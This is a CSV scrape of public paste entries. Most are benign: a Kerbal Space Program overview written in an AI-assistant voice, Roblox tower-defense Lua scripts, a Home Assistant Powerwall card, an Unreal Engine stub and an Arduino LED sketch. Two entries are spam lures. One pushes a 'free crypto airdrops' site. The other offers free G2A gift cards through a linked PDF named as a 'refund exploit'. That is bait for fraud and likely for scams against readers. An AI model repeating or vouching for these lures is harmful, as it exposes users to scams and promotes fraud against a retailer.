id,title,username,language,date,content
9KCVeNz7,Untitled,Glenpl,C++,Sunday 21st of January 2024 12:03:16 AM CDT,"Tell me about game ""kerbal space program"". 

---eeee

""Kerbal Space Program"" (KSP) is a space flight simulation video game that was originally developed by Squad, a Mexican game developer. It was first released for Microsoft Windows, macOS, and Linux in April 2015, after being in early access for several years.

In Kerbal Space Program, players take control of their own space program operated by the Kerbals, which are small green humanoid aliens. The game features a realistic orbital physics engine, allowing for real-life orbital maneuvers such as Hohmann transfer orbits and bi-elliptical transfer orbits.

The primary mode of the game has the player engaging in building spacecraft, managing resources, and conducting missions. The spacecraft is constructed from a variety of parts that must be assembled to create a functional ship. These parts include engines, fuel tanks, control surfaces, and more. Each component affects the ship's performance, requiring the player to carefully consider the trade-offs when designing their missions.

The game has three primary modes:

1. **Sandbox Mode**: This mode gives players the freedom to create and fly any spacecraft they can imagine, with no specific goals or limitations.

2. **Science Mode**: Players conduct scientific experiments to research new technology and advance the knowledge of Kerbalkind. Through this progress, more advanced parts and technologies become available for spacecraft construction.

3. **Career Mode**: This mode combines the aspects of sandbox and science modes but also introduces management aspects. Players must manage aspects of the space program, including finances, reputation, and mission contracts.

Kerbal Space Program is known for its challenging gameplay, educational aspects, and the accurate physics simulation it offers, which makes it both a game and a learning tool for understanding the basics of rocket science and orbital mechanics. The game's community has been praised for its creativity and enthusiasm, with players sharing custom mods, spacecraft designs, and even complete missions.

KSP has been used in educational settings as well as by space professionals and enthusiasts. Moreover, it has had several updates and expansion packs that have added new features, improved the graphics, and expanded the gameplay.

Squad released the Making History expansion in 2018, which introduced a mission builder and historical missions. The second expansion, Breaking Ground, was released in 2019, focusing on planetary exploration, new science collection capabilities, and more advanced robotics parts.

As of my knowledge cutoff date in 2023, Kerbal Space Program 2 is also in development, promising to build upon the success of the first game with new features, improved graphics, and more expansive gameplay. The sequel aims to introduce interstellar travel, new celestial bodies, and a multiplayer feature, among other enhancements."
hBSEki0v,List of all FREE Crypto Airdrops!,jusst2k4,GetText,Saturday 20th of January 2024 11:45:22 PM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://net-drop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://net-drop.netlify.app/

202089"
dYwbUs3c,pbs rolls,Zeefoe,Lua,Saturday 20th of January 2024 11:33:03 PM CDT,"local player = game.Players.LocalPlayer
local character = player.Character

local backpack = player:FindFirstChildOfClass(""Backpack"")

--toilet rolls
tools = 8

if backpack then
    local toolsToEquip = backpack:GetChildren()

    for loopCount = 1, math.min(#toolsToEquip, tools) do
        local currentTool = toolsToEquip[loopCount]

        for _, tool in pairs(character:GetDescendants()) do
            if tool:IsA(""Tool"") then
                tool.Parent = backpack
            end
        end

        if currentTool:IsA(""Tool"") then
            currentTool.Parent = character

            if loopCount == tools - 1 then
                currentTool.GripPos = Vector3.new(2, 2, -1)
            elseif loopCount == tools then
                currentTool.GripPos = Vector3.new(1, 2, -1)
            else
                currentTool.GripPos = Vector3.new(1.5, 0.5 - (loopCount - 1) * 0.9, 1.5)
                currentTool.GripUp = Vector3.new(0, 0, 90)
            end
        end
    end

    for _, finalTool in pairs(toolsToEquip) do
        if finalTool:IsA(""Tool"") then
            finalTool.Parent = character
        end
    end
end
"
GmfcQBVE,Controller (Local Script / EP.09),Anukun_Lucifer,Lua,Saturday 20th of January 2024 11:11:11 PM CDT,"local Players = game:GetService(""Players"")
local physicsservice = game:GetService(""PhysicsService"")
local replicatedstorage = game:GetService(""ReplicatedStorage"")
local runservice = game:GetService(""RunService"")
local userinputservice = game:GetService(""UserInputService"")

local gold = Players.LocalPlayer:WaitForChild(""Gold"")
local events = replicatedstorage:WaitForChild(""Events"")
local functions = replicatedstorage:WaitForChild(""Functions"")
local requestTowerFuntion = functions:WaitForChild(""RequestTower"")
local tower = replicatedstorage:WaitForChild(""Towers"")
local spawntowerevent = events:WaitForChild(""SpawnTower"")
local camera = workspace.CurrentCamera
local gui = script.Parent

local towertospawn = nil
local canplace = false
local rotation = 0
local platedTower = 0
local maxTowers = 10

local function UpdateGold()
	gui.Gold.Text = gold.Value
end
UpdateGold()
gold.Changed:Connect(UpdateGold)

local function MouseRaycast(blacklist)
	local mouseposition = userinputservice:GetMouseLocation()
	local mouseray = camera:ViewportPointToRay(mouseposition.X,mouseposition.Y)
	local raycastparams = RaycastParams.new()

	raycastparams.FilterType = Enum.RaycastFilterType.Blacklist
	raycastparams.FilterDescendantsInstances = blacklist

	local raycastresult = workspace:Raycast(mouseray.Origin,mouseray.Direction*1000, raycastparams)

	return raycastresult
end

local function RemovePlaceholderTower()
	if towertospawn then
		towertospawn:Destroy()
		towertospawn = nil
		rotation = 0
	end
end

local function AddPlaceholderTower(name)
	local towerExists = tower:FindFirstChild(name)
	if towerExists then
		RemovePlaceholderTower()
		towertospawn = towerExists:Clone()
		towertospawn.Parent = workspace

		for i, object in ipairs(towertospawn:GetDescendants()) do
			if object:IsA(""BasePart"") then
				physicsservice:SetPartCollisionGroup(object, ""Tower"")
				object.Material = Enum.Material.ForceField
			end
		end
	end
end

local function ColorPlanceholderTower(color)
	for i, object in ipairs(towertospawn:GetDescendants()) do
		if object:IsA(""BasePart"") then
			object.Color = color
		end
	end
end

gui.Tower.Title.Text = ""Towers""..platedTower..""/""..maxTowers
for i , tower in pairs(tower:GetChildren()) do
	local button = gui.Tower.Template:Clone()
	local config = tower:WaitForChild(""Config"")
	button.Name = tower.Name
	button.Image = config.Image.Texture
	button.Visible = true
	
	button.LayoutOrder = config.Price.Value
	button.Price.Text = config.Price.Value
	
	button.Parent = gui.Tower
	
	button.Activated:Connect(function()
		local allowedToSpawn = requestTowerFuntion:InvokeServer(tower.Name)
		if allowedToSpawn then
			AddPlaceholderTower(tower.Name)
		end
	end)
end

userinputservice.InputBegan:Connect(function(input, processed)
	if processed then
		return
	end

	if towertospawn then
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			if canplace then
				spawntowerevent:FireServer(towertospawn.Name, towertospawn.PrimaryPart.CFrame)
				platedTower += 1
				gui.Tower.Title.Text = ""Towers""..platedTower..""/""..maxTowers
				RemovePlaceholderTower()
			end
		elseif input.KeyCode == Enum.KeyCode.R then
			rotation += 90
		end
	end

end)

runservice.RenderStepped:Connect(function()
	if towertospawn then
		local result = MouseRaycast({towertospawn})
		if result and result.Instance then
			if result.Instance.Parent.Name == ""TowerArea"" then
				canplace = true
				ColorPlanceholderTower(Color3.new(0,1,0))
			else
				canplace = false
				ColorPlanceholderTower(Color3.new(1,0,0))
			end
			local x = result.Position.X
			local y = result.Position.Y + towertospawn.Humanoid.HipHeight + 4
			local z = result.Position.Z

			local cframe = CFrame.new(x,y,z) *CFrame.Angles(0,math.rad(rotation),0)
			towertospawn:SetPrimaryPartCFrame(cframe)
		end
	end
end)"
7f5t2Wwn,TowerScript (Module Script / EP.09),Anukun_Lucifer,Lua,Saturday 20th of January 2024 11:10:21 PM CDT,"local physicsservice = game:GetService(""PhysicsService"")
local serverstorage = game:GetService(""ServerStorage"")
local replicatedstorage = game:GetService(""ReplicatedStorage"")
local functions = replicatedstorage:WaitForChild(""Functions"")
local requestTowerFuntion = functions:WaitForChild(""RequestTower"")

local event = replicatedstorage:WaitForChild(""Events"")
local spawntowerevent = event:WaitForChild(""SpawnTower"")
local animatetowerevent = event:WaitForChild(""AnimateTower"")
local maxTowers = 10

local tower = {}
--------------------------------------------
local function FindNearestTarget(newTower,range)
	local nearestTarget = nil

	for i, target in ipairs(workspace.Grassland.Mob:GetChildren()) do
		local distance = (target.HumanoidRootPart.Position - newTower.HumanoidRootPart.Position).Magnitude
		if distance < range then
			nearestTarget = target
			range = distance
		end
	end

	return nearestTarget
end

function tower.Attack(newTower ,player)
	local config = newTower.Config
	local target = FindNearestTarget(newTower,config.Range.Value)
	
	if target and target:FindFirstChild(""Humanoid"") and target.Humanoid.Health > 0 then
		
		local targetCFrame = CFrame.lookAt(newTower.HumanoidRootPart.Position, target.HumanoidRootPart.Position)
		newTower.HumanoidRootPart.BodyGyro.CFrame = targetCFrame
		
		animatetowerevent:FireAllClients(newTower, ""Attack"")
		target.Humanoid:TakeDamage(config.Damage.Value)
		
		if target.Humanoid.Health <= 0 then
			player.Gold.Value += target.Humanoid.MaxHealth
		end
		
		task.wait(config.Cooldown.Value)
		
	end
	task.wait(0.1)
 	tower.Attack(newTower ,player)
end
---------------------------------------------
function tower.Spawn(player, name, cframe)
	local allowedToSpawn = tower.CheckSpawn(player, name)

	if allowedToSpawn then
		local newTower = replicatedstorage.Towers[name]:Clone()
		newTower.HumanoidRootPart.CFrame = cframe
		newTower.Parent = workspace.Grassland.Tower
		newTower.HumanoidRootPart:SetNetworkOwner(nil)
		
		local bodyGyro = Instance.new(""BodyGyro"")
		bodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
		bodyGyro.D = 0
		bodyGyro.CFrame = newTower.HumanoidRootPart.CFrame
		bodyGyro.Parent = newTower.HumanoidRootPart

		for i, object in ipairs(newTower:GetDescendants()) do
			if object:IsA(""BasePart"") then
				physicsservice:SetPartCollisionGroup(object, ""Tower"")
			end
		end
		
		player.Gold.Value -= newTower.Config.Price.Value
		player.PlacedTowers.Value +=1
		
		coroutine.wrap(tower.Attack) (newTower ,player)
	else
		warn(""Requested mob dose not exist"",name)
	end
end

spawntowerevent.OnServerEvent:Connect(tower.Spawn)

function tower.CheckSpawn(player, name)
	local towerExists = replicatedstorage.Towers:FindFirstChild(name)
	
	if towerExists then
		if towerExists.Config.Price.Value <= player.Gold.Value then
			print(""okkkkkkkkkkkkkkkkkkkkkkkkkkkkkk"")
			if player.PlacedTowers.Value < maxTowers then
				return true
			end
		end
	end
	return false
end

requestTowerFuntion.OnServerInvoke = tower.CheckSpawn

return tower"
xwc6BN3H,OnPlayerAdded (Script / EP.09),Anukun_Lucifer,Lua,Saturday 20th of January 2024 11:09:35 PM CDT,"local players = game:GetService(""Players"")
local physicsservice = game:GetService(""PhysicsService"")

players.PlayerAdded:Connect(function(player)
	
	local gold = Instance.new(""IntValue"")
	gold.Name = ""Gold""
	gold.Value = 250
	gold.Parent = player
	
	local placedTowers = Instance.new(""IntValue"")
	placedTowers.Name = ""PlacedTowers""
	placedTowers.Value = 0
	placedTowers.Parent = player
	
	player.CharacterAdded:Connect(function(character)
		for i, object in ipairs(character:GetDescendants()) do
			if object:IsA(""BasePart"") then
				physicsservice:SetPartCollisionGroup(object, ""Player"")
			end
		end
	end)
end)"
zNNEiGR5,G2A.com Free Gift Card Guide Jan 2024,ounnuo,GetText,Saturday 20th of January 2024 11:07:14 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_879767.pdf
 
Working as of
21 January 2024"
vnvbx6w9,Custom Tesla Powerwall Card - MKANET,MKANET,YAML,Saturday 20th of January 2024 10:43:12 PM CDT,"type: custom:stack-in-card
mode: vertical
cards:
  - type: markdown
    content: >
      ## Tesla Powerwall{% if is_state('binary_sensor.grid_status', 'off')
      %}<small><font color=""red"">&nbsp;&nbsp;⚠️&nbsp;Power Outage:
      &nbsp;&nbsp;~{{ states('sensor.estimated_battery_life_hours_remaining') }}
      battery hours remaining</font></small>{% endif %}
    card_mod:
      style: |
        ha-card {
          margin: 0;
          padding-left: 10px;
          padding-right: 10px;
          background: var(--card-background-color);
          box-shadow: none;
          border: none;
        }
        ha-markdown {
          font-size: 10px;
          color: var(--primary-text-color);
          margin-bottom: -8px;
        }
  - type: custom:power-flow-card-plus
    entities:
      grid:
        name: PG&E
        entity: sensor.powerwall_site_now_mod
        secondary_info:
          entity: sensor.pge_electric_cost_to_date
          unit_of_measurement: $
          unit_white_space: false
          color_value: true
        display_state: one_way
        color_circle: true
        color_icon: true
        color_value: true
        power_outage:
          entity: binary_sensor.grid_status
          state_alert: 'off'
      solar:
        entity: sensor.powerwall_solar_now
        display_zero_tolerance: 30
        icon: mdi:solar-panel-large
        secondary_info:
          entity: sensor.openweathermap_forecast_cloud_coverage
          unit_of_measurement: '%'
          unit_white_space: false
          color_value: true
        color_icon: true
        color_value: true
      battery:
        entity: sensor.powerwall_battery_now
        state_of_charge: sensor.powerwall_charge_actual
        state_of_charge_unit: '%'
        state_of_charge_unit_white_space: false
        display_state: one_way
        color_state_of_charge_value: true
        color_icon: true
        color_circle: true
      home:
        entity: sensor.powerwall_load_now
        color_icon: true
        color_value: true
    watt_threshold: 999
    calculate_flow_rate: true
    w_decimals: 1
    kw_decimals: 1
    min_flow_rate: 2.2
    max_flow_rate: 6
    display_zero_lines:
      mode: hide
    clickable_entities: true
    use_new_flow_rate_model: true
    max_expected_power: 5000
    card_mod:
      style: |
        @keyframes blink {
          0% { opacity: 1; }
          50% { opacity: 0; }
          100% { opacity: 1; }
        }
        ha-card {
          zoom: 1.2 !important;
          box-shadow: none !important;
          border: none !important;
          padding-left: 10px;
          padding-right: 10px;
        }
        .circle-container .grid.power-outage {
          color: #FF403D !important;
          animation: blink 2.475s linear infinite;
        }
        .label {
          font-weight: 700 !important;
        }
        .circle ha-icon {
          --mdc-icon-size: 36px;
        }
  - type: markdown
    content: ⠀
    card_mod:
      style: |
        ha-card {
          box-shadow: none;
          border: none;
          margin-bottom: -48px;
        }
  - type: custom:bar-card
    height: 31px
    direction: right
    positions:
      icon: 'off'
      indicator: 'off'
      title: 'off'
    severity:
      - hide: false
        from: '0'
        to: '19'
        color: '#C41400'
      - from: '20'
        to: '49'
        color: '#EA9000'
      - from: '50'
        to: '100'
        color: '#007A00'
    card_mod:
      style: |
        ha-card {
          border: none;
          padding-left: 14px;
          padding-right: 14px;
          background: var(--card-background-color);
          box-shadow: none;
        }
    entities:
      - entity: sensor.powerwall_charge_actual
        name: Powerwall Charge
  - type: custom:button-card
    entity: binary_sensor.powerwall_charging
    show_name: false
    show_icon: false
    show_label: true
    label: |-
      [[[
        var charge = states['sensor.powerwall_charge_actual'].state;
        var batteryStatus = parseFloat(states['sensor.apf_battery_entity'].state);
        var state = states['binary_sensor.powerwall_charging'].state;
        var icon = '';
        if (charge <= 19) icon = 'mdi:battery-charging-10';
        else if (charge <= 49) icon = 'mdi:battery-charging-30';
        else if (charge <= 100) icon = 'mdi:battery-charging-90';
        var label = (state == 'off') ? 'Standby' : 'Charging';
        if (batteryStatus < 0) label = 'Discharging';
        var textAnimationStyle = '';
        if (state == 'on') {
          textAnimationStyle = 'animation: blink 2.475s linear infinite;';
        }
        var iconHtml = '';
        if (state == 'on') {
          iconHtml = `<ha-icon icon='${icon}' style='color: #FFCC00; width: 20px; height: 20px;'></ha-icon>`;
        }
        return `<div style='text-align: center; display: inline-block; width: 100%; padding-bottom: 11px;'>
              ${iconHtml}
              <span style='margin-left: 6px; position: relative; top: 1.5px; font-size: 14px; font-weight: 700; color: #bbb; ${textAnimationStyle}'>${label}</span>
            </div>`;
      ]]]
    styles:
      card:
        - background-color: linear-gradient(rgba(105, 105, 105, 0.1), rgba(34, 34, 34, 0.95))
        - margin-top: '-9px'
        - border-top: none
        - border-top-left-radius: 0px
        - border-top-right-radius: 0px
        - box-shadow: none
      label:
        - justify-self: center
        - align-self: center
        - width: 100%
        - font-size: 14px
        - font-weight: 600
        - margin-top: '-8px'
    card_mod:
      style: |
        ha-card {
          border: none;
          background: var(--card-background-color);
          box-shadow: none;
          margin-bottom: 0px !important;
        }
  - type: custom:button-card
    entity: sensor.estimated_battery_life_hours_remaining
    tap_action:
      action: more-info
    layout: icon-label
    size: 20%
    color_type: card
    show_name: true
    show_state: true
    show_icon: false
    show_units: true
    card_mod:
      style: |
        ha-card {
          height: auto;
          padding-bottom: 25px !important;
          padding-left: 7px !important;
          background: transparent !important;
          box-shadow: none;
          border-top: none;
          margin: 0;
        }
    styles:
      grid:
        - grid-template-areas: '""n s""'
        - grid-template-columns: max-content min-content
        - grid-template-rows: 1fr
      name:
        - font-size: 14px
        - font-weight: 400
        - justify-self: start
        - padding-left: 22px
        - margin-right: 10px
        - white-space: nowrap
        - color: '#838383'
      state:
        - font-size: 14px
        - font-weight: 400
        - justify-self: start
        - padding-left: 0
        - color: '#B7A064'
        - margin-top: 1.8px
    name: 'Estimated outage battery runtime:'
    state_display: >
      [[[ return states['sensor.outage_battery_runtime_estimate'].state +
      '&nbsp; (' + states['sensor.estimated_battery_life_hours_remaining'].state
      + ' hours)' ]]]
"
CBFZzJRP,InventoryItem.cpp,devenshona,C++,Saturday 20th of January 2024 10:22:27 PM CDT,"// Fill out your copyright notice in the Description page of Project Settings.


#include ""Actors/InventoryItem.h""


// Sets default values
AInventoryItem::AInventoryItem()
{
	// Set this actor to call Tick() every frame.  You can turn this off to improve performance if you don't need it.
	PrimaryActorTick.bCanEverTick = true;
}

// Called when the game starts or when spawned
void AInventoryItem::BeginPlay()
{
	Super::BeginPlay();
	
}

// Called every frame
void AInventoryItem::Tick(float DeltaTime)
{
	Super::Tick(DeltaTime);
}

/**
 * Uses the given item.
 *
 * @param Row - The static item information.
 * @param InventoryComponentRef - The reference to the inventory component.
 * @param Index - The index of the item being used.
 *
 * @note This method is called when an item needs to be used.
 */
void AInventoryItem::UseItem_Implementation(FStaticItemInfo* Row,UInventoryComponent* InventoryComponentRef,int32 Index)
{
}



"
PJekQUkw,Lampu LED Berkedip dengan Kreativitas,cisco404,C++,Saturday 20th of January 2024 10:20:39 PM CDT,"// Definisi pin LED RGB
int redPin = 9;
int greenPin = 10;
int bluePin = 11;

void setup() {
  // Atur pin sebagai OUTPUT
  pinMode(redPin, OUTPUT);
  pinMode(greenPin, OUTPUT);
  pinMode(bluePin, OUTPUT);
}

void loop() {
  // Merah
  analogWrite(redPin, 255);
  analogWrite(greenPin, 0);
  analogWrite(bluePin, 0);
  delay(1000); // Tahan selama 1 detik

  // Hijau
  analogWrite(redPin, 0);
  analogWrite(greenPin, 255);
  analogWrite(bluePin, 0);
  delay(1000); // Tahan selama 1 detik

  // Biru
  analogWrite(redPin, 0);
  analogWrite(greenPin, 0);
  analogWrite(bluePin, 255);
  delay(1000); // Tahan selama 1 detik
}
"
